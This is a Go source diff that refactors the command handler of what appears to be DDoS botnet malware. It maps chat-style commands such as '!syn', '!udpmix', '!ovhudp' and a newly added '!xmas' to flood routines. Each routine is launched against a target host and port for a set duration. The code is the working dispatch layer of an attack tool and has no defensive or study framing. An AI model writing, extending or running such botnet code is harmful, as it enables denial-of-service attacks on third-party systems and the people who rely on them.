@@ -13,101 +13,43 @@ import (
 	"time"
 )
 
-var commands = []string{
-	"!syn",
-	"!udpmix",
-	"!https",
-	"!ovhudp",
-	"!sshblock",
-	"!tcpmix",
+var commands = map[string]func(context.Context, string, string){
+	"!xmas":     methods.XmasMethod,
+	"!syn":      methods.SynMethod,
+	"!udpmix":   methods.UdpMethod,
+	"!https":    methods.HttpsMethod,
+	"!ovhudp":   methods.OvhUdpMethod,
+	"!sshblock": methods.SshBlockMethod,
+	"!tcpmix":   methods.TcpMixMethod,
 }
 
 func CommandHandler(_command string) {
 	command := strings.ReplaceAll(string(_command), "\n", "")
 
-	checkcmd := func() bool {
-		for _, i := range commands {
+	checkcmd, cmdname := func() (bool, string) {
+		for i := range commands {
 			if strings.HasPrefix((command), i) {
-				return true
+				return true, i
 			}
 		}
-		return false
+		return false, ""
 	}()
 
-	if !checkcmd {
+	if !checkcmd || cmdname == "" {
 		return
 	}
 
 	target, port, duration := parseArgs(command)
 
-	if strings.HasPrefix(command, "!https") {
-		go func() {
-			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-			defer cancel()
+	go func() {
+		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
+		defer cancel()
 
-			methods.HttpsMethod(ctx, target, port)
+		if v := commands[cmdname]; v != nil {
+			v(ctx, target, port)
+		}
 
-		}()
-
-	}
-
-	if strings.HasPrefix(command, "!udpmix") {
-
-		go func() {
-			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-			defer cancel()
-
-			methods.UdpMethod(ctx, target, port)
-
-		}()
-
-	}
-
-	if strings.HasPrefix(command, "!ovhudp") {
-
-		go func() {
-			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-			defer cancel()
-
-			methods.OvhUdpMethod(ctx, target, port)
-
-		}()
-
-	}
-
-	if strings.HasPrefix(command, "!syn") {
-
-		go func() {
-			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-			defer cancel()
-
-			methods.SynMethod(ctx, target, port)
-
-		}()
-	}
-
-	if strings.HasPrefix(command, "!tcpmix") {
-
-		go func() {
-			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-			defer cancel()
-
-			methods.TcpMixMethod(ctx, target, port)
-
-		}()
-	}
-
-	if strings.HasPrefix(command, "!sshblock") {
-
-		go func() {
-			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-			defer cancel()
-
-			methods.SshBlockMethod(ctx, target, port)
-
-		}()
-	}
-
+	}()
 }
 
 func parseArgs(_args string) (target string, port string, duration int) {
@@ -115,12 +57,14 @@ func parseArgs(_args string) (target string, port string, duration int) {
 
 	args := strings.Split(_args, " ")
 
-	fmt.Println(args)
 	if len(args) < 4 {
 		return "", "", 0
 	}
 
-	duration, _ = strconv.Atoi(string(utils.FormatCommand(args[3])))
+	duration, err := strconv.Atoi(string(utils.FormatCommand(args[3])))
+	if err != nil {
+		fmt.Println(err)
+	}
 
 	return args[1], args[2], duration
 }
